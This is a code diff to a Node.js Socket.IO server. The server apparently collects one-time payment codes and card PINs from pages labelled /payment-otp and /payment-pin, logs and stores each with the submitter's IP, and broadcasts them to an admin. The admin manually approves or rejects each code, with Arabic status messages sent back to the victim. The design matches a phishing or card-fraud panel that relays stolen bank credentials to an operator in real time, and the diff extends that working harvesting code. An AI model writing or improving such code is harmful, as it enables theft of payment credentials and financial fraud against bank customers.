@@ -399,38 +399,64 @@ io.on('connection', (socket) => {
   socket.on('submitOTP', (data) => {
     console.log('🔐 Received OTP:', data);
     otpCodesData.push({ ...data, timestamp: new Date() });
-    io.emit('otpSubmitted', { ...data, timestamp: new Date() });
+    
+    // Broadcast using standardized format
+    broadcastEntry({
+      id: `otp-${data.ip}-${Date.now()}`,
+      sourcePage: '/payment-otp',
+      payload: data,
+      submittedAt: new Date().toISOString()
+    });
   });
 
   // استقبال PIN
   socket.on('submitPIN', (data) => {
     console.log('🔑 Received PIN:', data);
     pinCodesData.push({ ...data, timestamp: new Date() });
-    io.emit('pinSubmitted', { ...data, timestamp: new Date() });
+    
+    // Broadcast using standardized format
+    broadcastEntry({
+      id: `pin-${data.ip}-${Date.now()}`,
+      sourcePage: '/payment-pin',
+      payload: data,
+      submittedAt: new Date().toISOString()
+    });
   });
 
-  // موافقة على OTP
+  // Admin sends OTP verification status
+  socket.on('otpVerificationStatus', (data) => {
+    console.log('🔐 OTP verification status from admin:', data);
+    io.emit('otpVerificationStatus', data);
+  });
+
+  // Admin sends PIN verification status
+  socket.on('pinVerificationStatus', (data) => {
+    console.log('🔑 PIN verification status from admin:', data);
+    io.emit('pinVerificationStatus', data);
+  });
+
+  // Legacy: موافقة على OTP (backwards compatibility)
   socket.on('approveOTP', ({ ip }) => {
     console.log('✅ OTP approved for IP:', ip);
-    io.emit('otpVerificationStatus', { ip, status: 'approved' });
+    io.emit('otpVerificationStatus', { ip, status: 'approved', message: 'تم قبول الرمز' });
   });
 
-  // رفض OTP
+  // Legacy: رفض OTP (backwards compatibility)
   socket.on('rejectOTP', ({ ip }) => {
     console.log('❌ OTP rejected for IP:', ip);
-    io.emit('otpVerificationStatus', { ip, status: 'rejected' });
+    io.emit('otpVerificationStatus', { ip, status: 'rejected', message: 'رمز غير صحيح' });
   });
 
-  // موافقة على PIN
+  // Legacy: موافقة على PIN (backwards compatibility)
   socket.on('approvePIN', ({ ip }) => {
     console.log('✅ PIN approved for IP:', ip);
-    io.emit('pinVerificationStatus', { ip, status: 'approved' });
+    io.emit('pinVerificationStatus', { ip, status: 'approved', message: 'تم قبول الرمز' });
   });
 
-  // رفض PIN
+  // Legacy: رفض PIN (backwards compatibility)
   socket.on('rejectPIN', ({ ip }) => {
     console.log('❌ PIN rejected for IP:', ip);
-    io.emit('pinVerificationStatus', { ip, status: 'rejected' });
+    io.emit('pinVerificationStatus', { ip, status: 'rejected', message: 'رمز غير صحيح' });
   });
 
   socket.on('disconnect', () => {
